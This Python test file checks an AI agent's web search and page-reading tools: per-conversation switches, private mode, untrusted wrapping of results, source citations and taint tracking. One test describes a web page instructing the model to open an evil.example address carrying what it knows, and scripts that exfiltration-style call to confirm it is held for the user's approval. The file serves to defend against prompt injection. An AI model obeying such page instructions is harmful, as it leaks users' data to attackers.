"""Web tools in tasks (Phase 3 spec §6): offered per conversation, untrusted, cited. Fixtures come from test_engine."""
import socket
from types import SimpleNamespace

import httpx
import pytest

from aethel.tools import web
from aethel.tools.groups import GROUPS
from tests.fakes import factory_from, tool_call
from tests.test_engine import h, plan, until  # noqa: F401  (h is a fixture)

pytestmark = pytest.mark.anyio

RESULTS = [{"title": "Rain in Paris", "href": "https://a.example/rain", "body": "April showers."}]


@pytest.fixture
def w(h, monkeypatch):  # noqa: F811
    """h, plus the real web tools in each engine's registry (search stubbed, pages from a mock transport)."""
    monkeypatch.setattr(web, "_search", lambda query, n: RESULTS)
    monkeypatch.setattr(web.socket, "getaddrinfo",   # every name resolves to a public address: no real DNS
                        lambda host, port, *a, **k: [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", port))])
    fetched = []

    def serve(request):
        fetched.append(str(request.url))
        return httpx.Response(200, headers={"content-type": "text/plain"}, text="Paris sees rain in April.")

    client = httpx.AsyncClient(transport=httpx.MockTransport(serve))
    made = []

    def make(turns, *, web_on=True, groups_on=False, internet=False, private=False, **kw):
        h.settings.update({"internet": internet, "private_mode": private,
                           "token_saving": {"tool_groups": groups_on}})
        engine, provider = h.make(turns, settings=h.settings, **kw)
        for name in ("web_search", "web_read"):
            engine.registry.unregister(name)
        for t in web.web_tools(lambda ctx: ctx.sources, client):
            engine.registry.register(t)
        conv = h.convs.create()
        h.convs.set_web(conv.id, web_on)
        made.append(engine)
        return engine, provider, conv

    yield SimpleNamespace(h=h, make=make, fetched=fetched)
    for engine in made:
        for name in ("web_search", "web_read"):
            engine.registry.unregister(name)


async def run(engine, conv, goal="find out about rain in Paris"):
    task_id = await engine.start(conversation_id=conv.id, goal=goal)
    await engine.wait_idle()
    return task_id


async def test_a_task_with_the_web_on_can_search_and_cites_its_sources(w):
    turns = [[plan(["Search"])], [tool_call("web_search", call_id="s1", query="rain in paris")],
             [tool_call("finish_task", summary="It rains in April [1].")]]
    engine, provider, conv = w.make(turns)
    task_id = await run(engine, conv)
    assert {"web_search", "web_read"} <= set(provider.tools_seen[1])
    assert "Cite sources with [n]" in provider.calls[1][0].content
    step = w.h.tasks.steps(task_id)[0]
    assert (step.tool, step.ok, step.untrusted) == ("web_search", True, True)         # untrusted in the log
    tool_msg = next(m.content for m in provider.calls[2] if m.role == "tool")
    assert tool_msg.startswith('<untrusted source="web_search">') and "[1] Rain in Paris" in tool_msg
    sources = next(e for e in w.h.events if e["type"] == "sources")
    assert sources["task_id"] == task_id and sources["sources"][0]["url"] == "https://a.example/rain"
    final = next(m for m in w.h.msgs.list(conv.id) if m.role == "assistant")
    assert final.meta["sources"] == sources["sources"] and sources["message_id"] == final.id
    assert w.h.tasks.get(task_id).state == "done"


async def test_what_a_task_read_on_the_web_taints_it(w, tmp_path):
    out = tmp_path / "out" / "x.txt"
    turns = [[plan(["Search"])], [tool_call("web_search", call_id="s1", query="rain")],
             [tool_call("fs_write", call_id="f1", path=str(out), content="hi")]]
    engine, provider, conv = w.make(turns)
    task_id = await engine.start(conversation_id=conv.id, goal="x")
    asked = await until(w.h.events, lambda e: e["type"] == "approval_needed")   # a write is no longer waved through
    assert asked["tool"] == "fs_write"
    await engine.cancel(task_id)
    await engine.wait_idle()
    assert not out.exists()


async def test_with_the_web_off_for_the_conversation_the_task_has_no_web_tools(w):
    turns = [[plan(["Search"])], [tool_call("web_search", call_id="s1", query="rain")],
             [tool_call("finish_task", summary="Done.")]]
    engine, provider, conv = w.make(turns, web_on=False, internet=True)
    task_id = await run(engine, conv)
    assert "web_search" not in provider.tools_seen[1] and "web_read" not in provider.tools_seen[1]
    assert "web_search" not in provider.calls[0][1].content                              # not in the planner's list either
    assert "Cite sources with [n]" not in provider.calls[1][0].content
    reply = next(m.content for m in provider.calls[2] if m.role == "tool")
    assert reply.startswith("Error: web access is off for this conversation")           # a guessed call is refused
    assert w.h.tasks.steps(task_id) == [] and not [e for e in w.h.events if e["type"] == "sources"]


async def test_private_mode_keeps_the_web_off_even_when_the_conversation_says_on(w):
    engine, provider, conv = w.make([[plan(["x"])], [tool_call("finish_task", summary="Done.")]], private=True)
    # private mode runs on the local model only, so the scripted provider answers as "local"
    w.h.settings.update({"roles": {"agent": [{"provider": "local", "model": "local"}]}})
    engine.router.factory = factory_from({"local:local": provider})
    await run(engine, conv)
    assert provider.tools_seen and "web_search" not in provider.tools_seen[1]


async def test_the_global_switch_is_followed_when_the_conversation_has_no_opinion(w):
    engine, provider, conv = w.make([[plan(["x"])], [tool_call("finish_task", summary="Done.")]],
                                    web_on=None, internet=True)
    await run(engine, conv)
    assert "web_search" in provider.tools_seen[1]


async def test_a_task_that_found_nothing_publishes_no_sources(w):
    engine, provider, conv = w.make([[plan(["x"])], [tool_call("finish_task", summary="Done.")]])
    await run(engine, conv)
    assert not [e for e in w.h.events if e["type"] == "sources"]
    assert "sources" not in next(m for m in w.h.msgs.list(conv.id) if m.role == "assistant").meta


async def test_web_is_a_group_on_request_when_groups_are_on_and_the_web_is_on(w):
    turns = [[plan(["Search"])], [tool_call("use_tools", call_id="u", group="web")],
             [tool_call("web_read", call_id="r", url="https://a.example/rain")],
             [tool_call("finish_task", summary="Done [1].")]]
    engine, provider, conv = w.make(turns, groups_on=True)
    task_id = await run(engine, conv)
    assert "web" in GROUPS and "web (" in provider.calls[1][0].content            # in the catalogue...
    assert "web_search" not in provider.tools_seen[1]                              # ...not carried by default
    assert "web_search" in provider.tools_seen[2]                                  # ...but there once asked for
    assert [s.tool for s in w.h.tasks.steps(task_id)] == ["web_read"]
    note = next(e for e in w.h.events if e["type"] == "task_note")
    assert note["text"] == "Asked for web tools"
    assert next(e for e in w.h.events if e["type"] == "sources")["sources"][0]["url"] == "https://a.example/rain"


async def test_with_groups_on_and_the_web_off_the_catalogue_never_offers_it(w):
    engine, provider, conv = w.make([[plan(["x"])], [tool_call("use_tools", call_id="u", group="web")],
                                     [tool_call("finish_task", summary="Done.")]], web_on=False, groups_on=True)
    await run(engine, conv)
    assert "web (" not in provider.calls[1][0].content
    assert provider.tools_seen[1] == [] or "web_search" not in provider.tools_seen[1]
    reply = next(m.content for m in provider.calls[2] if m.role == "tool")
    assert reply.startswith("Error: there's no tool group 'web'")


# ---- reading outside content, then fetching an address it chose --------------------------------------------------
async def test_after_reading_outside_content_an_address_nobody_gave_needs_the_user_s_ok(w):
    """A page can tell the model to open https://evil.example/?d=<what it knows>. Opening it would carry that out."""
    turns = [[plan(["Search"])], [tool_call("web_search", call_id="s1", query="rain")],
             [tool_call("web_read", call_id="r1", url="https://evil.example/?d=secret")]]
    engine, provider, conv = w.make(turns)
    task_id = await engine.start(conversation_id=conv.id, goal="find out about rain in Paris")
    asked = await until(w.h.events, lambda e: e["type"] == "approval_needed")
    assert asked["tool"] == "web_read" and "evil.example" in asked["summary"]
    assert "didn't come from you or a search result" in asked["reason"]
    await engine.cancel(task_id)
    await engine.wait_idle()
    assert w.fetched == []                                    # nothing was fetched while it waited


async def test_a_listed_address_or_one_in_the_goal_needs_no_approval_even_after_a_search(w):
    turns = [[plan(["Search"])], [tool_call("web_search", call_id="s1", query="rain")],
             [tool_call("web_read", call_id="r1", url="https://a.example/rain")],            # came up in the search
             [tool_call("web_read", call_id="r2", url="https://goal.example/page")],         # the user wrote it
             [tool_call("finish_task", summary="Done [1].")]]
    engine, provider, conv = w.make(turns)
    task_id = await run(engine, conv, goal="summarise https://goal.example/page and what the weather news says")
    assert [e for e in w.h.events if e["type"] == "approval_needed"] == []
    assert w.fetched == ["https://a.example/rain", "https://goal.example/page"]
    assert [s.tool for s in w.h.tasks.steps(task_id)] == ["web_search", "web_read", "web_read"]


async def test_an_address_read_before_any_outside_content_is_fine_and_an_allow_covers_that_site_only(w):
    turns = [[plan(["Read"])], [tool_call("web_read", call_id="r0", url="https://first.example/")],   # nothing tainted yet
             [tool_call("web_read", call_id="r1", url="https://evil.example/a")],
             [tool_call("web_read", call_id="r2", url="https://evil.example/b")],                      # same site
             [tool_call("web_read", call_id="r3", url="https://other.example/c")],                     # another site
             [tool_call("finish_task", summary="Done.")]]
    engine, provider, conv = w.make(turns)
    task_id = await engine.start(conversation_id=conv.id, goal="x")
    first = await until(w.h.events, lambda e: e["type"] == "approval_needed")        # evil.example/a
    assert "evil.example/a" in first["summary"] and w.fetched == ["https://first.example/"]
    await engine.approvals.resolve(first["approval_id"], "allow_task")
    second = await until(w.h.events, lambda e: e["type"] == "approval_needed" and e is not first)
    assert "other.example" in second["summary"]                                       # evil.example/b went straight through
    assert w.fetched == ["https://first.example/", "https://evil.example/a", "https://evil.example/b"]
    await engine.approvals.resolve(second["approval_id"], "deny")
    await engine.wait_idle()
    assert w.fetched[-1] != "https://other.example/c" and w.h.tasks.get(task_id).state == "done"


# ---- the switch is read live ------------------------------------------------------------------------------------------
async def test_turning_the_web_off_mid_task_stops_the_next_web_call(w, monkeypatch):
    turns = [[plan(["Search twice"])], [tool_call("web_search", call_id="s1", query="one")],
             [tool_call("web_search", call_id="s2", query="two")], [tool_call("finish_task", summary="Done.")]]
    engine, provider, conv = w.make(turns)
    searches = []

    def search(query, n):
        searches.append(query)
        w.h.convs.set_web(conv.id, False)       # the user switches the web off while the first search is running
        return RESULTS

    monkeypatch.setattr(web, "_search", search)
    task_id = await run(engine, conv)
    assert searches == ["one"]                                           # the second search never ran
    refusal = next(m.content for m in provider.calls[3] if m.role == "tool" and "web access is off" in m.content)
    assert refusal.startswith("Error: web access is off for this conversation")
    assert "web_search" not in provider.tools_seen[2]                    # and it isn't offered any more either
    assert [s.tool for s in w.h.tasks.steps(task_id)] == ["web_search"]


async def test_private_mode_switched_on_mid_task_wins_too(w, monkeypatch):
    turns = [[plan(["Search twice"])], [tool_call("web_search", call_id="s1", query="one")],
             [tool_call("web_search", call_id="s2", query="two")], [tool_call("finish_task", summary="Done.")]]
    engine, provider, conv = w.make(turns)
    # private mode runs on the local model only, so the scripted provider answers as "local" from the start
    w.h.settings.update({"roles": {"agent": [{"provider": "local", "model": "local"}]}})
    engine.router.factory = factory_from({"local:local": provider})
    searches = []

    def search(query, n):
        searches.append(query)
        w.h.settings.update({"private_mode": True})  # switched on while the first search is running
        return RESULTS

    monkeypatch.setattr(web, "_search", search)
    await run(engine, conv)
    assert searches == ["one"] and "web_search" not in provider.tools_seen[2]
